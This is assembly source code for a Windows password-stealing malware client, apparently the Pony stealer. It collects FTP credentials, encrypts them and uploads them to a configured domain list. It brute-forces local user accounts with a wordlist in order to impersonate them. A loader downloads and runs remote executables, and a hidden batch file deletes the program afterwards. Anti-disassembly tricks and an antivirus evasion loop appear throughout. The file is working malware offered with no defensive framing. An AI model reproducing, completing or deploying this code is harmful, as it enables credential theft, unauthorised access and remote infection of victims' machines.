.486
.model flat, stdcall

include windows.inc
include kernel32.inc
include user32.inc
include advapi32.inc
include ole32.inc
include shlwapi.inc
include shell32.inc
include oleaut32.inc
include wininet.inc
include urlmon.inc
include crypt32.inc
include colib.inc
include oaidl.inc
include wsock32.inc
include userenv.inc

includelib kernel32.lib
includelib ole32.lib
includelib user32.lib
includelib advapi32.lib
includelib shell32.lib
includelib wininet.lib
includelib shlwapi.lib
includelib urlmon.lib
includelib oleaut32.lib
includelib crypt32.lib
includelib wsock32.lib
includelib userenv.lib

includelib aplib.lib
includelib 3DES.lib

; Common used macros

m2m MACRO M1, M2
	push M2
	pop  M1
ENDM

@Next MACRO EntryLoop: REQ
	cld
	xor     eax, eax
	mov	ecx, -1
	repnz scasb
	cmp     byte ptr[edi], al
	jnz     EntryLoop
ENDM

AntiDisasmTrick MACRO
	LOCAL	@fake
	LOCAL	@real

	xor		edx, eax
	xor		eax, edx
	xor		edx, eax

	IFNDEF	ENABLE_DEBUG_MODE
	push	@real
	nop
	clc
	nop
	jc		@fake
	nop
	retn
@fake:	
	db	0feh
@real:
	ENDIF
ENDM

; Includes

include ..\Config.inc

include Utils.asm
include Crypto.asm
include NetCode.asm
IFNDEF DISABLE_GRABBER
include PasswordModules.asm
ENDIF
include WordList.asm

LOCAL_USER struct
	lpNext				dd	?
	szUserName			dd	?
	szRoamingProfile	dd	?
LOCAL_USER ends

.data
	lpLocalUserList	dd	NULL
	szLocalUserName	dd	NULL
	szHashValue		db	"Client Hash",0
	szStreamOKCode		db	"STATUS-IMPORT-OK",0
	hDllInstance	dd	NULL
	IFDEF	SAVE_REPORT
	szOutFileName		db	"out.bin",0
	ENDIF

.code

; KAV heuristic fucker
KAVHeurKiller proc uses esi
	LOCAL	counter: DWORD
	AntiDisasmTrick

	push	eax
	nop
	mov	ecx, ecx
	pop	eax
	mov	ecx, ecx
	push	eax
	sub	esi, esi
	pop	eax
	mov	ecx, ecx
	nop
	push	19131012
	mov	ecx, ecx
	nop
	pop	counter
	mov edx, eax
	.WHILE	counter
		mov edx, eax
		mov	ecx, ecx
		add	eax, esi
		mov edx, eax
		nop
		mov	ecx, ecx
		push	eax
		mov	ecx, ecx
		mov edx, eax
		invoke	GetTickCount
		nop
		mov	ecx, ecx
		pop	eax
		mov edx, eax
		mov	ecx, ecx
		add	eax, edx
		mov	ecx, ecx
		mov edx, eax
		dec	counter
	.ENDW
	ret
KAVHeurKiller endp

IFDEF ENCRYPT_REPORT
DecodeReportPassword proc lpszPasswordStr
	AntiDisasmTrick

	mov	eax, lpszPasswordStr
	.IF	eax
		.WHILE	byte ptr[eax]
			dec	byte ptr[eax]
			dec	byte ptr[eax]
			inc	eax
		.ENDW
	.ENDIF
	ret
DecodeReportPassword endp
ENDIF

IFNDEF DISABLE_GRABBER
StreamCheckStatus proc uses ebx Stream
	LOCAL	mem: DWORD
	LOCAL	len: DWORD
	LOCAL	chk_str_mem: DWORD

	AntiDisasmTrick
	
	mov	chk_str_mem, 0
	sub	ebx, ebx
	invoke	GetHGlobalFromStream, Stream, addr mem
	test	eax, eax
	.IF	SUCCEEDED
		invoke	StreamGetLength, Stream
		mov	len, eax
		inc	eax
		invoke	MemAlloc, eax
		mov	chk_str_mem, eax

		invoke	GlobalLock, mem
		.IF	eax
			invoke	MoveMem, eax, chk_str_mem, len
			invoke	GlobalUnlock, mem
		.ENDIF
	.ENDIF
	invoke	StreamGotoEnd, Stream
	
	.IF	chk_str_mem
		invoke	StrStrI, chk_str_mem, offset szStreamOKCode
		.IF	eax
			mov	ebx, TRUE
		.ENDIF
		invoke	MemFree, chk_str_mem
	.ENDIF
	mov	eax, ebx
	ret
StreamCheckStatus endp

CollectPasswordsIntoStream proc stream
	AntiDisasmTrick

	; Reset stream
	invoke	StreamClear, stream

	; Write report header
	invoke	StreamWriteData, stream, offset lpBaseHdr, cBaseHdrLen
	; Write version header
	invoke	StreamWriteData, stream, offset lpVerHdr, cVerHdrLen
	; Collect FTP passwords
	invoke	GrabFTPPasswords, stream
	IFDEF	SEND_EMPTY_REPORTS
	mov	eax, TRUE
	ENDIF
	ret
CollectPasswordsIntoStream endp

IsReportUpdated proc stream, lpReportHash
	LOCAL	report_updated: DWORD
	LOCAL	stored_hash_len: DWORD

	AntiDisasmTrick

	; Calculate MD5 checksum for report data stream
	invoke	StreamMD5, stream, lpReportHash

	mov	report_updated, TRUE

	; Retrieve stored hash value
	invoke	ReadAppOptionValue, offset szHashValue, addr stored_hash_len
	.IF	eax
		push	eax
		.IF	stored_hash_len == 16
			invoke	CompareMem, lpReportHash, eax, 16
			.IF	eax
				mov	report_updated, FALSE
			.ENDIF
		.ENDIF
		call	MemFree
	.ENDIF

	mov	eax, report_updated
	ret
IsReportUpdated endp

; BuildPasswordStream() - collect report data, pack & encrypt stream
; Return codes:
; 0 - error
; 1 - OK
; 2 - report is not modified
; 3 - password stream is empty (there are no passwords collected)

BUILD_PWD_STREAM_ERR equ 0
BUILD_PWD_STREAM_OK	equ 1
BUILD_PWD_STREAM_NOT_MODIFIED equ 2
BUILD_PWD_STREAM_EMPTY equ 3

BuildPasswordStream proc uses ebx stream, lpReportHash
	AntiDisasmTrick

	sub	ebx, ebx ; BUILD_PWD_STREAM_ERR

	invoke	CollectPasswordsIntoStream, stream
	.IF	eax
		invoke	StreamGetLength, stream
		.IF	!eax
			; Something went wrong while collecting passwords
			jmp	@stream_error
		.ENDIF

  		invoke	IsReportUpdated, stream, lpReportHash
  		IFDEF	SEND_MODIFIED_ONLY
  		.IF	eax
  		ENDIF
			IFDEF	PACK_REPORT
			; Pack stream using apLib 
			invoke	StreamPack, stream
			.IF	!eax
				jmp	@stream_error
			.ENDIF
			ENDIF
			
			; Write non-crypted data CRC32 (used also as a password check if report encryption is enabled)
			invoke	StreamWriteCRC32, stream
			.IF	!eax
				jmp	@stream_error
			.ENDIF
			
			; Validate CRC32
			invoke	StreamCheckCRC32, stream
			.IF	!eax
				jmp	@stream_error
			.ENDIF

			IFDEF	ENCRYPT_REPORT
				; Encrypt stream using RC4 algorithm
				invoke	StreamEncrypt, stream, offset CReportPassword
				.IF	!eax
					jmp	@stream_error
				.ENDIF

				; Write encrypted-data CRC32
				invoke	StreamWriteCRC32, stream
				.IF	!eax
					jmp	@stream_error
				.ENDIF

				; Validate CRC32
				invoke	StreamCheckCRC32, stream
				.IF	!eax
					jmp	@stream_error
				.ENDIF
			ENDIF

			; Additional encryption layer
			invoke	StreamRandEncrypt, stream
			.IF	!eax
				jmp	@stream_error
			.ENDIF

			; Check if stream is corrupted
			invoke	StreamGetLength, stream
			IFDEF	PACK_REPORT
				IFDEF	ENCRYPT_REPORT
					.IF	eax <= 32
						sub	eax, eax
					.ENDIF
				ENDIF
			ENDIF

			; Check stream length
			.IF	eax && eax < MEM_LIMIT
				mov	ebx, BUILD_PWD_STREAM_OK
			.ENDIF
			
			IFDEF	SAVE_REPORT
			invoke	StreamSaveToFile, stream, offset szOutFileName
			ENDIF
		
  		IFDEF	SEND_MODIFIED_ONLY
  		.ELSE
  			; Report is not modified
  			mov	ebx, BUILD_PWD_STREAM_NOT_MODIFIED
  		.ENDIF
  		ENDIF
	.ELSE
		mov	ebx, BUILD_PWD_STREAM_EMPTY
	.ENDIF

@stream_error:
	mov	eax, ebx
	ret
BuildPasswordStream endp

; If stream build failed - try to rebuild it from scratch
BuildPasswordStream_Stable proc lpOutStream, report_hash
	AntiDisasmTrick

	invoke	BuildPasswordStream, lpOutStream, report_hash
	.IF	!eax
		invoke	BuildPasswordStream, lpOutStream, report_hash
		.IF	!eax
			invoke	BuildPasswordStream, lpOutStream, report_hash
		.ENDIF
	.ENDIF
	ret
BuildPasswordStream_Stable endp

ScanAndSend proc uses ebx edi
	LOCAL	report_hash[16]: BYTE
	LOCAL	stream: DWORD
	LOCAL	out_stream: DWORD
	LOCAL	dwUploadRetries: DWORD

	AntiDisasmTrick

	sub	ebx, ebx

	; Initialize WSA for each impersonated user
	invoke	MyDownloadInit

	; Delete previous stored report
	IFDEF	SAVE_REPORT
	invoke	DeleteFile, offset szOutFileName
	ENDIF

	; Create new IStream instance
	mov	stream, NULL
	invoke	StreamCreate, addr stream
	.IF	!stream
		invoke	StreamCreate, addr stream
		.IF	!stream
			invoke	StreamCreate, addr stream
		.ENDIF
	.ENDIF
	
	.IF	stream
		invoke	BuildPasswordStream_Stable, stream, addr report_hash
		.IF	eax == BUILD_PWD_STREAM_OK
			mov	edi, offset szDomainList
			.WHILE	byte ptr[edi] && !ebx
				mov	dwUploadRetries, UPLOAD_RETRIES

			@retry_upload:
				; Upload data
				mov	out_stream, 0
				invoke	MyUploadStream, edi, stream, addr out_stream
				.IF	eax && out_stream
					; Validate received stream ("STATUS-IMPORT-OK")
					invoke	StreamCheckStatus, out_stream
					mov	ebx, eax
					.IF	!ebx
						invoke	StreamRandDecrypt, out_stream
						.IF	eax
							invoke	StreamCheckStatus, out_stream
							mov	ebx, eax
						.ENDIF
					.ENDIF
				.ENDIF
				invoke	StreamFree, out_stream

				; Move to next upload retry
				.IF	!ebx && dwUploadRetries
					dec	dwUploadRetries
					invoke	Sleep, 5000
					jmp	@retry_upload
				.ENDIF

				; Move to next URL
				.WHILE	byte ptr[edi]
					inc	edi
				.ENDW
				inc	edi
			.ENDW

			.IF	ebx
				; Write MD5 report hash
				invoke	WriteAppOptionValue, offset szHashValue, addr report_hash, sizeof report_hash
			.ENDIF
		.ENDIF
	.ENDIF
	
	invoke	StreamFree, stream
	
	mov	eax, ebx
	ret
ScanAndSend endp

ENDIF

IFDEF ENABLE_LOADER

.data
	szNumToStrExeFmt		db	'%d.exe',0
	szMD5HashStr 			db	'%02X',0
	szLoaderValueDupeCheck	db	'true',0

.code

RunLoader proc uses edi esi hUserToken
	LOCAL	szTempPath[MAX_PATH+1]: BYTE
	LOCAL	stream: DWORD
	LOCAL	lpTempName[50]: BYTE
	LOCAL	file_name: DWORD
	LOCAL	wStreamHdr: DWORD
	LOCAL	out_hash[16]: BYTE
	LOCAL	hash_str: DWORD
	LOCAL	dwDataLen: DWORD
	LOCAL	execute_next: DWORD

	AntiDisasmTrick

	mov	edi, offset szLoaderList
	.IF	byte ptr[edi]
	@next_link:
		mov	execute_next, TRUE
		invoke	MyDownload, edi, addr stream
		.IF	eax
			.IF	stream
				invoke	StreamMD5, stream, addr out_hash
				sub	esi, esi
				mov	hash_str, esi
				.WHILE	esi < 16
					movzx	eax, out_hash[esi]
					invoke	wsprintf, addr lpTempName, offset szMD5HashStr, eax
					invoke	PonyStrCatFreeArg1, hash_str, addr lpTempName
					mov	hash_str, eax
					inc	esi
				.ENDW

				IFDEF	LOADER_EXECUTE_NEW_FILES_ONLY
					; Check for duplicate execution
					invoke	ReadAppOptionValue, hash_str, addr dwDataLen
					.IF	eax
						invoke	MemFree, eax
					.ELSE
				ENDIF

				; Validate PE file
				invoke	StreamGotoBegin, stream
				mov	wStreamHdr, 0
				invoke	StreamRead, stream, addr wStreamHdr, 2
				.IF	(eax) && (wStreamHdr == 'ZM')
					invoke	GetTempPath, MAX_PATH, addr szTempPath
					.IF	eax && eax <= MAX_PATH
						; Export stream data into temp filename
						invoke	GetTickCount
						invoke	wsprintf, addr lpTempName, offset szNumToStrExeFmt, eax
						invoke	CreateDirectory, addr szTempPath, NULL
						invoke	CheckEndSlash, addr szTempPath
						.IF	!eax
							invoke	PonyStrCat, addr szTempPath, offset szSlash
							lea	edx, lpTempName
							invoke	PonyStrCatFreeArg1, eax, edx
						.ELSE
							invoke	PonyStrCat, addr szTempPath, addr lpTempName
						.ENDIF
						mov	file_name, eax
						invoke	StreamSaveToFile, stream, file_name
						.IF	eax
							; Write execution dupe check value
							invoke	lstrlen, offset szLoaderValueDupeCheck
							invoke	WriteAppOptionValue, hash_str, offset szLoaderValueDupeCheck, eax

							invoke	ExecuteFile, file_name, hUserToken
							IFDEF	LOADER_RESERVE_MODE
							mov	execute_next, FALSE
							ENDIF
						.ENDIF
						invoke MemFree, file_name
					.ENDIF
				.ENDIF

				IFDEF	LOADER_EXECUTE_NEW_FILES_ONLY
					.ENDIF
				ENDIF
				invoke	MemFree, hash_str
				invoke	StreamFree, stream
			.ENDIF
		.ENDIF
		.IF	execute_next
			@Next	@next_link
		.ENDIF
	.ENDIF
	ret
RunLoader endp

ENDIF

IFDEF SELF_DELETE

.data
	szBatchFmt				db      '%d.bat',0
	szSelfDelQuoteFmt       db      '      "%s"   ',0
	szShellExecute			db		'ShellExecuteA',0
	szBatchFile             db      13,10,9,9,13,10,13,10,09,"   :ktk   ",13,10,13,10,13,10,"     del    ",9," %1  ",13,10,9,"if  ",9,9," exist ",9,"   %1  ",9,"  goto ",9,13," ktk",13,10," del ",9,"  %0 ",0
	szShell32Lib			db		'shell32.dll',0

.code

SelfDelete proc
	LOCAL   lpSelfFileName: DWORD
	LOCAL   lpShellExecuteStr: DWORD
	LOCAL   hFile: DWORD
	LOCAL   lpBatchFileName: DWORD
	LOCAL	lpBatchName: DWORD

	AntiDisasmTrick

	mov	edx, edx
	mov	ecx, ecx
	nop
	invoke  MemAlloc, MAX_PATH+1
	nop
	mov	edx, edx
	mov	ecx, ecx
	nop
	mov     lpBatchName, eax
	nop

	invoke	GetTickCount
	invoke	wsprintf, lpBatchName, offset szBatchFmt, eax

	invoke  MemAlloc, MAX_PATH+1
	nop
	mov	edx, edx
	mov	ecx, ecx
	nop
	mov     lpSelfFileName, eax
        
	mov	edx, edx
	mov	ecx, ecx
	nop
	invoke  MemAlloc, MAX_PATH+1
	nop
	mov	edx, edx
	mov	ecx, ecx
	mov     lpBatchFileName, eax

	nop
	invoke  MemAlloc,  MAX_PATH+1
	mov	edx, edx
	mov	ecx, ecx
	nop
	mov	edx, edx
	mov	ecx, ecx
	mov     lpShellExecuteStr, eax
	mov	ecx, ecx
	mov	edx, edx
                
	; Get full pathname of the application (caller)
	mov	edx, edx
	mov	ecx, ecx
	nop
	invoke  GetModuleFileName, hDllInstance, lpSelfFileName, MAX_PATH
	nop
	mov	edx, edx
	mov	ecx, ecx

	; Get temp path for self deleting batch file 
	mov	edx, edx
	mov	ecx, ecx
	invoke	GetTempPath, MAX_PATH, lpBatchFileName
	.IF	eax
	mov	ecx, ecx
		mov	edx, edx
		nop
		invoke  lstrcat, lpBatchFileName, lpBatchName
	.ENDIF
	
	mov	edx, edx
	invoke  CreateFile, lpBatchFileName, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
	mov	ecx, ecx
	mov     hFile, eax
	mov	ecx, ecx
	inc     eax
	.IF	!eax
		; If file creation failed in temp directory, then try to do it in the caller directory
		invoke  lstrcpy, lpBatchFileName, lpSelfFileName
		; Remove name of the executable and add name of the batch file
		; eg. C:\path\myapp.exe => C:\path\a.bat
		invoke  StrRChrI, lpBatchFileName, NULL, '\'
		.IF     eax
			inc	eax
			invoke  lstrcpy, eax, lpBatchName
		.ENDIF
		invoke  CreateFile, lpBatchFileName, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
		mov     hFile, eax
		inc     eax
		jz      @sd_end
	.ENDIF

	; Write batch file into created file
	invoke  lstrlen, offset szBatchFile
	invoke	SafeWrite, hFile, offset szBatchFile, eax
	push	eax
	invoke  CloseHandle, hFile
	pop	eax
	.IF	!eax
		; Write failed
		jmp	@sd_end
	.ENDIF

	invoke  wsprintf, lpShellExecuteStr, addr szSelfDelQuoteFmt, lpSelfFileName

	; Execute batch file
	invoke	LoadLibrary, offset szShell32Lib
	.IF	eax
		invoke	GetProcAddress, eax, offset szShellExecute
		.IF	eax
			push    SW_HIDE
			push    0
			push    lpShellExecuteStr
			push    lpBatchFileName
			push    offset szTextOpen
			push    0
			call    eax
		.ENDIF
	.ENDIF

@sd_end:
	invoke	MemFree, lpBatchName
	invoke	MemFree, lpSelfFileName
	invoke	MemFree, lpBatchFileName
	invoke	MemFree, lpShellExecuteStr
	ret
SelfDelete endp

ENDIF

EnumLocalUsers proc uses ebx
	LOCAL	pBuf: DWORD
	LOCAL	pTmpBuf: DWORD
	LOCAL	dwTotalEntries: DWORD
	LOCAL	dwResumeHandle: DWORD
	LOCAL	dwEntriesRead: DWORD
	LOCAL	nStatus: DWORD
	LOCAL	szUserName: DWORD
	LOCAL	szRoamingProfile: DWORD

	AntiDisasmTrick

	.IF	!MyNetUserEnum || !MyNetApiBufferFree
		sub	eax, eax
		ret
	.ENDIF

	mov	pBuf, NULL
	mov	pTmpBuf, NULL
	mov	dwEntriesRead, 0
	mov dwTotalEntries, 0
	mov	dwResumeHandle, 0

@cotinue_user_enum:
	lea	eax, dwResumeHandle
	push	eax
	lea	eax, dwTotalEntries
	push	eax
	lea	eax, dwEntriesRead
	push	eax
	push	MAX_PREFERRED_LENGTH
	lea	eax, pBuf
	push	eax
	push	FILTER_NORMAL_ACCOUNT
	push	3
	push	NULL
	call	MyNetUserEnum
	mov	nStatus, eax

	.IF	nStatus == NERR_Success || nStatus == ERROR_MORE_DATA
		m2m	pTmpBuf, pBuf
		.IF	pTmpBuf != NULL
			mov	ebx, pTmpBuf
			.WHILE	dwEntriesRead
				invoke	UnicodeToAnsi, [ebx].USER_INFO_3.usri3_profile
				mov	szRoamingProfile, eax
				invoke	UnicodeToAnsi, [ebx].USER_INFO_3.usri3_name
				.IF	eax
					mov	szUserName, eax
					invoke	MemAlloc, sizeof LOCAL_USER
					m2m		[eax].LOCAL_USER.szRoamingProfile, szRoamingProfile
					m2m		[eax].LOCAL_USER.szUserName, szUserName
					m2m		[eax].LOCAL_USER.lpNext, lpLocalUserList
					mov	lpLocalUserList, eax
				.ENDIF
				add	ebx, sizeof USER_INFO_3
				dec	dwEntriesRead
			.ENDW
			push	pBuf
         	call	MyNetApiBufferFree
         	mov	pBuf, NULL
		.ENDIF

		.IF	nStatus == ERROR_MORE_DATA
			jmp	@cotinue_user_enum
		.ENDIF
	.ENDIF

	.IF	pBuf != NULL
		push	pBuf
       	call	MyNetApiBufferFree
	.ENDIF

	mov	eax, TRUE
	ret
EnumLocalUsers endp

PROFILEINFO struct
	dwSize			dd	?
	dwFlags			dd	?
  	lpUserName		dd	?
	lpProfilePath	dd	?
	lpDefaultPath	dd	?
	lpServerName	dd	?
	lpPolicyPath	dd	?
	hProfile		dd	?
PROFILEINFO ends

IFNDEF DISABLE_GRABBER
Impersonate_ScanAndSend proc uses ebx edi
	LOCAL	phToken: HANDLE
	LOCAL	szUserNameLC: DWORD
	LOCAL	lpProfileInfo: PROFILEINFO
	LOCAL	IsUserProfileLoaded: DWORD

	AntiDisasmTrick

	.IF	!MyImpersonateLoggedOnUser || !MyLogonUser
		sub	eax, eax
		ret
	.ENDIF

	mov	ebx, lpLocalUserList
	.WHILE	ebx
		; Enable required privileges for each user (after previous impersonation)
		invoke	EnableRequiredImpersonationPrivileges

		; Do not try to impersonate user that started application
		.IF	szLocalUserName
			invoke	lstrcmpi, szLocalUserName, [ebx].LOCAL_USER.szUserName
			.IF	!eax
				jmp	@next_user
			.ENDIF
		.ENDIF

		; Try username:username pair
		mov	phToken, NULL
		lea	eax, phToken
		push	eax
		push	LOGON32_PROVIDER_DEFAULT
		push	LOGON32_LOGON_INTERACTIVE
		push	[ebx].LOCAL_USER.szUserName
		push	NULL
		push	[ebx].LOCAL_USER.szUserName
		call	MyLogonUser
		.IF	eax
			jmp	@password_found
		.ENDIF

		; Try username:lowercase username pair
		invoke	lstrdup, [ebx].LOCAL_USER.szUserName
		mov	szUserNameLC, eax

		invoke	lstrlen, [ebx].LOCAL_USER.szUserName
		invoke	LCMapString, LOCALE_USER_DEFAULT, LCMAP_LOWERCASE, [ebx].LOCAL_USER.szUserName, eax, szUserNameLC, eax
		.IF	eax
			mov	phToken, NULL
			lea	eax, phToken
			push	eax
			push	LOGON32_PROVIDER_DEFAULT
			push	LOGON32_LOGON_INTERACTIVE
			push	szUserNameLC
			push	NULL
			push	[ebx].LOCAL_USER.szUserName
			call	MyLogonUser
			.IF	eax
				invoke	MemFree, szUserNameLC
				jmp	@password_found
			.ENDIF
		.ENDIF

		invoke	MemFree, szUserNameLC

		; Brute-force logon password
		mov	edi, offset CWordList
	@next_password:

		mov	phToken, NULL
		lea	eax, phToken
		push	eax
		push	LOGON32_PROVIDER_DEFAULT
		push	LOGON32_LOGON_INTERACTIVE
		push	edi
		push	NULL
		push	[ebx].LOCAL_USER.szUserName
		call	MyLogonUser

		.IF	eax
		@password_found:
			; Load user profile
			mov	lpProfileInfo.dwSize, sizeof PROFILEINFO
			mov	lpProfileInfo.dwFlags, PI_NOUI
			m2m	lpProfileInfo.lpUserName, [ebx].LOCAL_USER.szUserName
			m2m	lpProfileInfo.lpProfilePath, [ebx].LOCAL_USER.szRoamingProfile
			mov	lpProfileInfo.lpDefaultPath, 0
			mov	lpProfileInfo.lpServerName, 0
			mov	lpProfileInfo.lpPolicyPath, 0
			mov	lpProfileInfo.hProfile, 0

			invoke	LoadUserProfile, phToken, addr lpProfileInfo
			.IF	eax
				.IF	 lpProfileInfo.hProfile != NULL
					m2m	dwCurrentUserKey, lpProfileInfo.hProfile
				.ENDIF
				mov	IsUserProfileLoaded, TRUE
			.ELSE
				mov	IsUserProfileLoaded, FALSE
			.ENDIF

			push	phToken
			call	MyImpersonateLoggedOnUser
			.IF	eax
				; User impersonated!
				invoke	ScanAndSend

				; Terminate impersonation
				.IF	MyRevertToSelf
					call	MyRevertToSelf
				.ENDIF

				mov	dwCurrentUserKey, HKEY_CURRENT_USER
			.ENDIF

			.IF	IsUserProfileLoaded
				invoke	UnloadUserProfile, phToken, lpProfileInfo.hProfile
			.ENDIF

			invoke	CloseHandle, phToken
		.ENDIF

		@Next	@next_password

	@next_user:
		mov	ebx, [ebx].LOCAL_USER.lpNext
	.ENDW

	mov	eax, TRUE
	ret
Impersonate_ScanAndSend endp

ENDIF

InitApp proc lpUserToken
	LOCAL	dwUserNameSize: DWORD

	AntiDisasmTrick

	invoke	OleInitialize, NULL
	invoke	LoadLibs
	invoke	KAVHeurKiller

	invoke	EnableRequiredImpersonationPrivileges

	invoke	IsProcessRunningUnderLocalSystem
	.IF	eax
		invoke	ImpersonateLocalSystemUser, lpUserToken
		.IF	eax
			mov	IsProcessImpersonated, TRUE
		.ENDIF
	.ENDIF

	; Get impersonated username to ignore it in brute-force procedure
	invoke	MemAlloc, UNLEN+1
	mov	szLocalUserName, eax
	mov	dwUserNameSize, UNLEN+1
	invoke	GetUserName, szLocalUserName, addr dwUserNameSize
	.IF	!eax
		invoke	MemFree, szLocalUserName
		mov	szLocalUserName, NULL
	.ENDIF

	invoke	FillInstalledList
	invoke	CRC32BuildTable
	IFNDEF DISABLE_GRABBER
	IFDEF ENCRYPT_REPORT
	invoke	DecodeReportPassword, offset CReportPassword
	ENDIF
	ENDIF
	ret
InitApp endp

; Supress any unhandled exceptions
MyUnhandledExceptionFilter proc lpTopLevelExceptionFilter
	AntiDisasmTrick

	invoke	ExitProcess, 0
	mov	eax, EXCEPTION_CONTINUE_SEARCH
	ret
MyUnhandledExceptionFilter endp

DoWork proc
	LOCAL	lpUserToken: DWORD

	AntiDisasmTrick

	IFNDEF	ENABLE_DEBUG_MODE
	invoke	SetUnhandledExceptionFilter, offset MyUnhandledExceptionFilter
	ENDIF

	; Initialize application
	mov	lpUserToken, NULL ; impersonated user token
	invoke	InitApp, addr lpUserToken

	invoke	KAVHeurKiller

	invoke	DecipherList, offset CWordList

	; Scan and send passwords
	IFNDEF DISABLE_GRABBER
	invoke	ScanAndSend
	ENDIF

	; Run loader (it will attempt to download and execute files with current logged on account privileges
	; when run from Windows Service [LocalSystem user], which has limited (tricked) access to HKCU path and %APPDATA%)
	IFDEF	ENABLE_LOADER
	invoke	RunLoader, lpUserToken
	ENDIF

	; Terminate impersonation
	.IF	IsProcessImpersonated
		.IF	MyRevertToSelf
			call	MyRevertToSelf
		.ENDIF
		mov	dwCurrentUserKey, HKEY_CURRENT_USER
	.ENDIF

	; Scan and send passwords for other (impersonated) users
	IFNDEF DISABLE_GRABBER
	invoke	EnumLocalUsers
	invoke	Impersonate_ScanAndSend
	ENDIF

	; Self delete executable (works also for DLL mode)
	IFDEF	SELF_DELETE
	invoke	SelfDelete
	ENDIF

	ret
DoWork endp

IFDEF DLLMODE

MainEntryPoint proc hinstDLL, fdwReason, pvReserved
	AntiDisasmTrick

	.IF	fdwReason == DLL_PROCESS_ATTACH
		m2m	hDllInstance, hinstDLL
		invoke	DoWork
	.ENDIF
	mov	eax, TRUE
	ret
MainEntryPoint endp

ELSE

MainEntryPoint:
	AntiDisasmTrick

	invoke	DoWork

	invoke	ExitProcess, 0
ENDIF

end MainEntryPoint